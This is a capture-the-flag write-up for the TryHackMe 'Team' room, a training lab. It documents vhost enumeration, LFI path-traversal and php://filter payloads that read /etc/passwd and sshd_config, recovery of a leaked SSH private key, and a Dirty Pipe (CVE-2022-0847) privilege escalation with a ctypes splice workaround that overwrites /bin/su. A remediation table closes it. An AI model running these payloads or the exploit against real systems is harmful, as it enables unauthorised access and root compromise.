# TryHackMe — "Team" — Writeup

**Difficulty:** Easy
**Target IP:** `10.114.155.108`
**Vhost:** `team.thm` (and `dev.team.thm`)
**Result:** `user.txt` + `root.txt` — fully pwned ✅

> Accessed from a headless Kali VM (on the THM VPN) and viewed in a host browser
> over an SSH local‑port‑forward, with `team.thm` / `dev.team.thm` mapped to
> `127.0.0.1` in the host's `/etc/hosts`.


---

## 1. Recon

### Port / service scan
```bash
nmap -sC -sV -p- 10.114.155.108
```
Relevant services:

| Port | Service |
|------|---------|
| 21   | FTP (`ftpuser` exists) |
| 22   | SSH (OpenSSH) |
| 80   | HTTP (Apache) |

### Web — initial hint
The web root references the hostname **`team.thm`**, so add it to `/etc/hosts`
and browse by name (the app is vhost‑based).

---

## 2. Web enumeration

### Subdomain / vhost enumeration
```bash
└─$ ffuf -u http://team.thm -H "Host: FUZZ.team.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 11366

```
`-fs` to filter out false positives.
Candidates probed: `www`, `dev`, `www.dev`. The interesting one is **`dev.team.thm`**.

### Directory enumeration
![alt text](pictures/gobuster_team.thm.png)

### The lead
`dev.team.thm` exposes a page that links to:
```
http://dev.team.thm/script.php?page=
```
The `page=` parameter is a classic **Local File Inclusion / Path Traversal** sink.

---

## 3. Local File Inclusion → information disclosure

### Confirm traversal
```
http://dev.team.thm:8080/script.php?page=../../../etc/passwd
```
Returns the user list:

```
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
```

Real login users: **dale**, **gyles** (both `/bin/bash`), and **ftpuser** (FTP).

### Reading the app's own source (PHP filter)
```
http://dev.team.thm:8080/script.php?page=php://filter/convert.base64-encode/resource=script.php
```
Decode the base64 — confirms it's a simple include wrapper with `teamshare.php`
as the fallback page.

---

## 4. Foothold — SSH key via config misconfiguration

### Dead ends (documented honestly)
- `/home/dale/.bash_history` (and others) were **empty**.
- `/home/dale/.ssh/id_rsa` returned **blank** via LFI — the `.ssh` dir perms
  (`700`) block the web user (`www-data`) from reading it.
- A **Hydra** brute‑force against SSH (rockyou + seclists) was attempted and
  **failed** — and is the wrong tool here anyway (noisy, rate‑limited, not the
  intended path).

### The actual win: key leaked in the SSH config
Reading the SSH server config via the LFI:
```
http://dev.team.thm:8080/script.php?page=../../../etc/ssh/sshd_config
```
…revealed **dale's private SSH key pasted directly into `sshd_config`** — a
glaring misconfiguration, and the intended foothold.

### Cleaning the key
The key copied out of the rendered config with `#` comment markers and lost line
breaks. Rebuild it by keeping only base64 characters and re‑wrapping:

```bash
python3 -c "
import re, textwrap
d = open('key_messy.txt').read()
d = re.sub(r'-----(BEGIN|END) OPENSSH PRIVATE KEY-----', '', d)
b = re.sub(r'[^A-Za-z0-9+/=]', '', d)
open('id_rsa','w').write('-----BEGIN OPENSSH PRIVATE KEY-----\n'
    + '\n'.join(textwrap.wrap(b,70)) + '\n-----END OPENSSH PRIVATE KEY-----\n')
"

chmod 600 id_rsa
ssh-keygen -y -f id_rsa     # validates: prints the matching public key
```
The key header decoded to `none/none` → **unencrypted**, so no passphrase to crack.

### Login
```bash
ssh -i id_rsa dale@10.114.155.108
id
cat ~/user.txt        # user flag (also obtainable directly via the LFI)
```

**`user.txt` captured.**

---

## 5. Privilege escalation — Dirty Pipe (CVE-2022-0847)

### Enumerate kernel
```bash
uname -r
```
The kernel fell in the **Dirty Pipe** vulnerable range
(**CVE-2022-0847**, Linux 5.8 → 5.16.11 / 5.15.25 / 5.10.102).

> Dirty Pipe abuses the way `splice()` populates a pipe's page cache: an
> unprivileged user can splice bytes from a **read‑only** file into a pipe, then
> overwrite the cached pages past the spliced region — letting them write into
> files they only have read access to. The exploit used this to clobber
> **`/bin/su`** and drop a root shell.

### Transfer the exploit
```bash
# from Kali (on the VPN):
scp -i id_rsa exploit.py dale@10.114.155.108:/tmp/
```

### The `os.splice` snag (and the fix)
Running the exploit failed with:
```
AttributeError: module 'os' has no attribute 'splice'
```
`os.splice()` only exists in **Python ≥ 3.10**, and the target shipped an older
interpreter. Since `splice()` is essential to the bug (a normal read/write copy
won't trigger it), it was re‑implemented by calling **glibc `splice` directly via
`ctypes`**:

```python
import ctypes, os
_libc = ctypes.CDLL("libc.so.6", use_errno=True)
_libc.splice.restype = ctypes.c_long
_libc.splice.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int,
                         ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint]

def _splice(fd_in, fd_out, count, offset_src=None, offset_dst=None, flags=0):
    o_in  = ctypes.byref(ctypes.c_longlong(offset_src)) if offset_src is not None else None
    o_out = ctypes.byref(ctypes.c_longlong(offset_dst)) if offset_dst is not None else None
    n = _libc.splice(fd_in, o_in, fd_out, o_out, count, flags)
    if n < 0:
        e = ctypes.get_errno(); raise OSError(e, os.strerror(e))
    return n
```
Then swap the exploit's `n = os.splice` for `n = _splice`.

> Simpler alternative when available: run the **unmodified** exploit with a newer
> interpreter (`python3.10 exploit.py`).

### Root
```bash
python3 exploit.py     # overwrites /bin/su, spawns root shell
id                     # uid=0(root)
cat /root/root.txt
```

**`root.txt` captured. Box pwned.** 🏴

> Note: Dirty Pipe was likely an **unintended shortcut** — the box's designed
> privesc path was probably a dale → gyles → root chain via `sudo -l`. Worth
> revisiting `sudo -l` as dale/gyles to learn the intended route. Root is root,
> but understanding the meant‑to‑be path is the point of the room.

---

## 6. Attack path summary

```
team.thm (Host header)
  └─ vhost enum ─────────────► dev.team.thm
       └─ dir enum ──────────► /assets /images /robots.txt
            └─ /script.php?page= ► LFI / path traversal
                 ├─ ../../../etc/passwd ► users: dale, gyles, ftpuser
                 ├─ hydra brute force ► FAILED (wrong path)
                 └─ ../../../etc/ssh/sshd_config ► dale's private key (misconfig)
                      └─ ssh -i id_rsa dale ► user.txt
                           └─ uname -r ► Dirty Pipe (CVE-2022-0847)
                                └─ ctypes splice fix ► /bin/su overwrite ► ROOT
                                     └─ root.txt ► PWNED
```

---

## 7. Lessons learned

- **Map the file‑read primitive before brute‑forcing.** An LFI beats Hydra every
  time — and brute force was a dead end here.
- **Read configs, not just the obvious `.ssh/id_rsa`.** Perms blocked the key at
  its normal path; the misconfig leaked it elsewhere (`sshd_config`).
- **Use PHP wrappers** (`php://filter`) to read app source through an LFI.
- **A blank LFI response ≠ "file missing"** — often it's a permissions block.
- **Know your `splice`/page‑cache primitives** — Dirty Pipe is a textbook
  read‑only‑file overwrite.

---

## 8. Remediation (defender view)

| Issue | Fix |
|-------|-----|
| LFI in `script.php?page=` | Whitelist allowed pages; never pass user input to `include`; disable `allow_url_include`. |
| Private key in `sshd_config` | Never store private keys in configs; rotate the exposed key immediately. |
| Vulnerable kernel | Patch to a kernel ≥ 5.16.11 / 5.15.25 / 5.10.102 (CVE-2022-0847). |
| World‑reachable dev vhost | Restrict `dev.*` to internal/authenticated access. |
| Weak/forgotten accounts | Audit `ftpuser`, disable unused services (FTP), enforce key‑only SSH. |
```
